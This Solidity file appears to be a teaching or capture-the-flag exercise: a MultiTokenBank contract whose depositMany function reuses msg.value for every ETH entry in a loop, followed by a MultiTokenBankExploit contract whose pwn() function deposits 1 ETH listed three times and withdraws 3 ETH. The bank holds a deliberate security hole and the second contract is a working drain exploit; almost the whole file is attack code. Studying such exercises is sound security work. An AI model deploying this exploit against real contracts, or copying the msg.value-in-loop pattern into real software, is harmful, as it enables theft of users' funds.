// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;
import "sce/sol/IERC20.sol";

contract MultiTokenBank {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    mapping(address => mapping(address => uint256)) balances;

    function depositMany(
        address[] calldata _tokens,
        uint256[] calldata _amounts
    ) public payable {
        for (uint256 i = 0; i < _tokens.length; i++) {
            deposit(_tokens[i], _amounts[i]);
        }
    }

    function deposit(address _token, uint256 _amount) public payable {
        if (_token == ETH) {
            require(_amount == msg.value, "amount != msg.value");
        } else {
            IERC20(_token).transferFrom(msg.sender, address(this), _amount);
        }
        balances[_token][msg.sender] += _amount;
    }

    function withdraw(address _token, uint256 _amount) public {
        balances[_token][msg.sender] -= _amount;

        if (_token == ETH) {
            payable(msg.sender).transfer(_amount);
        } else {
            IERC20(_token).transfer(msg.sender, _amount);
        }
    }
}



interface IMultiTokenBank {
    function balances(address, address) external view returns (uint256);
    function depositMany(address[] calldata, uint256[] calldata)
        external
        payable;
    function deposit(address, uint256) external payable;
    function withdraw(address, uint256) external;
}

contract MultiTokenBankExploit {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    IMultiTokenBank public bank;

    constructor(address _bank) {
        bank = IMultiTokenBank(_bank);
    }

    receive() external payable {}

    function pwn() external payable {
        address[] memory tokens = new address[](3);
        tokens[0] = ETH;
        tokens[1] = ETH;
        tokens[2] = ETH;

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1e18;
        amounts[1] = 1e18;
        amounts[2] = 1e18;

        bank.depositMany{value: 1e18}(tokens, amounts);
        bank.withdraw(ETH, 3 * 1e18);
    }
}
